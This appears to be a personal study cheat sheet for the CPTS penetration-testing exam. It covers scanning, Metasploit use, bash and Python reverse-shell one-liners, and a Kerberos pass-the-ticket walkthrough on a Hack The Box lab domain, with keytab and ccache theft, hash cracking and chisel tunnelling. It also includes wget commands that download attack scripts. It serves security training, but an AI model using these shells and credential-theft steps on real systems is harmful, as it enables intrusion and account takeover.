---
title: General Vulnerability Assessment & Exploitation
parent: CPTS
grand_parent: Categories
nav_order: 3
has_children: false
layout: default
---

# General Vulnerability Assessment & Exploitation

## Overview

This section covers service-agnostic vulnerability identification and exploitation techniques that are foundational for all environments, including port-based services, OS-level exploits, and general infrastructure misconfigurations.

---

## General Vulnerability Assessment

### Service Discovery (Baseline)

```bash
nmap -sC -sV -O -p- <target>
```
- `-sC`: Default scripts
- `-sV`: Version detection
- `-O`: OS fingerprinting
- `-p-`: Scan all 65535 ports

### Banner Grabbing (Manual)

```bash
nc <target> 21
nc <target> 80
```

```bash
curl -I http://<target>
```

### Exploit Database Search

```bash
searchsploit <service or version>
```

Use: [https://exploit-db.com](https://exploit-db.com)

### Nessus / OpenVAS (if permitted)
- Run authenticated + unauthenticated scans
- Prioritize based on CVSS score

### Vulnerability Prioritization Table

| Factor       | Description                              |
|--------------|-------------------------------------------|
| CVSS Score   | Severity level                            |
| Exploitability | Ease of use and success probability    |
| Risk         | System damage potential                   |
| Business Impact | Value of data or system targeted       |

---

## General Exploitation Techniques

### Reverse Shell Techniques

#### Bash
```bash
bash -i >& /dev/tcp/<your_ip>/4444 0>&1
```

#### Python
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<your_ip>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

#### Netcat Listener
```bash
nc -lvnp 4444
```

### Metasploit Framework

#### Find Exploit
```bash
search <service/version>
```

#### Use Exploit
```bash
use exploit/multi/some_module
set RHOSTS <target>
set LHOST <your_ip>
set PAYLOAD linux/x86/meterpreter/reverse_tcp
run
```

### Password Attacks

## Pass the Ticket (PtT) from Linux

> Useful links:
> keytab: https://kb.iu.edu/d/aumh
> ccache files: https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html
> KeyTabExtract download: wget https://raw.githubusercontent.com/sosdave/KeyTabExtract/refs/heads/master/keytabextract.py
> Chisel: https://github.com/jpillora/chisel (it's just a tunnel)

- Kerberos ticket stored in env var `KRB5CCNAME` by default

### Scenario

Given:
- User: david@inlanefreight.htb
- Pass: Password2

**Pre-Req(s)**
Domain-Joined Linux Machine
- Check with `realm list`
    - alternatives include sssd or winbind: `ps -ef | grep -i "winbind\|sssd"`

**Find goodies**
Find KeyTab Files: `find / -name *keytab* -ls 2>/dev/null`
Find KeyTab files in Cronjobs: `crontab -l`
- **kinit** is a signifier of Kerberos
Find ccache files: `env | grep -i krb5`
Find ccache files in `/tmp`: `ls -la /tmp`

**Abusing KeyTab files**
Method 1 (impersonate user with a keytab file):
```bash
$ klist -k -t <absolute keytab file> # list keytab file info
$ klist  # impersonate user with a keytab
$ smbclient //<share>/<user> -k -c <command> # connect to SMB share, ex: smbclient //DC01/carlos -k -c ls
```

**Method 2 (extracting secrets from keytab file)**:
```bash
$ python3 /opt/keytabextract.py <absolute keytab file> # extract keytab hashes with KeyTabExtract
```
Then, crack the NTLM hash (crackstation.net, hashcat, john, etc -- doesn't really matter)
```bash
$ su - <user>@<domain> # log in as user
$ klist # impersonate user with keytab
```

Repeat the process for as many users as appropriate.

**Abusing KeyTab ccache**
PrivEsc to root
```bash
$ ssh svc_workstations@inlanefreight.htb@<ip> -p <port>
$ sudo -l
# for the sake of this, imagine it is (ALL) ALL
$ sudo su
# whoami
root # success
```

Hunt for ccache files: `# ls -la /tmp`
Identify group membership: `id`
Import the ccache file into our current session
```bash
# klist
# cp /tmp/<file> .
# export KRB5CCNAME=/root/<file>
# klist
# smbclient //<share>/C$ -k -c ls -no-pass
```


**If we don't have connection to KDC/Domain Controller, and we can't use the DC for name resolution, we can do the following:**
```bash
$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz # install chisel
$ gzip -d chisel_1.7.7_linux_amd64.gz
$ mv chisel_* chisel && chmod +x ./chisel
$ sudo ./chisel server --reverse
$ xfreerdp /v:<ip> /u:<user> /d:<domain> /p:<password> /dynamic-resolution
```

Run Chisel from MS01
```
> C:\tools\chisel.exe client <your ip>:8080 R:socks
```

Now we get to transfer the file over!
```bash
$ export KRB5CCNAME=<absolute file location>
$ proxychains impacket-wmiexec dc01 -k
```

**Evil-WinRM**
```bash
$ sudo apt-get install krb5-user -y
# set realm to the domain (eg. INLANEFREIGHT.HTM) and admin. server to Kerb realm (eg. DC01)
$ proxychains evil-winrm -i dc01 -r inlanefreight.htb
```

**Other**
To use ccache file in WIndows or kirbi file in Linux, you can use [impacket-ticketConverter](https://github.com/fortra/impacket/blob/master/examples/ticketConverter.py)
Then, import to Windows: C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
Or play around with Linikatz:
```bash
$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
$ /opt/linikatz.sh
```

## Post-Exploitation (General)

### Local Enumeration (Linux)
```bash
uname -a
id
cat /etc/*-release
ls -la /home/
```

### Check for SUID binaries
```bash
find / -perm -u=s -type f 2>/dev/null
```

### Kernel Exploits
Search using:
```bash
uname -r
searchsploit <kernel version>
```

Use compiled exploits or `linux-exploit-suggester.sh`

---

## Notes
- Always follow Rules of Engagement
- Document findings with screenshots or terminal logs
- Prioritize low-risk exploits for exam-style environments
- Clean up if required (reverse shells, temp files)
